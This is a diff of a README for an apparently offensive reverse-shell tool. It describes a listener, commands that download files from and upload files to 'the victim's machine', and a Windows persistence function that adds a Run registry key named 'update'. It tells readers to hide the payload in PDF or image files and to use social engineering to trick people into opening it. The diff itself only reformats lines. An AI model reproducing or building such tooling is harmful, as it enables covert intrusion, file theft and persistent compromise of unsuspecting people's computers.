@@ -13,13 +13,8 @@ Runs a TCP server in the attacker's machine and goes into listening mode, waitin
 ### Commands:
 Once the victim has connected to our server, we can run the commands from his machine like a normal reverse shell, but also, this tool has 4 own commands:
 - **exit, Exit:** Finishes client-server connection.
-- **down:** Download any file from client's side to our machine. The structure has to be down + [dest_path] + [file_name]. 
-Example:
-`$down /home/user/Documents/ file.txt`
-Where [dest_path] is the route where we want to download the file **(don't add a file name here, just the path)**, and [file_name] is the name of the file in the victim's machine. The tool will use [file_name] to name the downloaded file.
-- **up:** Up any file from our machine to the victim's machine. The structure has to be up + [dest_path] + [file_name].
-Example:
-`$up /home/victim_folder/Desktop/folder/ /home/our_user/file.txt`
+- **down:** Download any file from client's side to our machine. The structure has to be down + [dest_path] + [file_name]. Example: `$down /home/user/Documents/ file.txt`. Where [dest_path] is the route where we want to download the file **(don't add a file name here, just the path)**, and [file_name] is the name of the file in the victim's machine. The tool will use [file_name] to name the downloaded file.
+- **up:** Up any file from our machine to the victim's machine. The structure has to be up + [dest_path] + [file_name]. Example: `$up /home/victim_folder/Desktop/folder/ /home/our_user/file.txt`
 
 ## reverse_shell.py
 Connects via TCP to listener server.  It runs once a person opens it; you can hide it in a pdf file, png, jpg, etc. Use your social engineering skills to deceive people to open it ;).
@@ -42,6 +37,7 @@ def becomePersistent(self):
             subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + fileLocation + '"', shell=True)
 ```
 Locate the file into a hard-to-find path and runs it every time that the system turns on. In this case, the function creates a registry of the file and runs it when the machine turns on. As the reverse shell is destined to a common user, the persistent mode is made to run into Windows system (because a common user uses Windows).
+
 **Important:** If you want to test the persistent mode, I recommend you do it into a virtual machine to avoid some damage into your own computer.
 
 
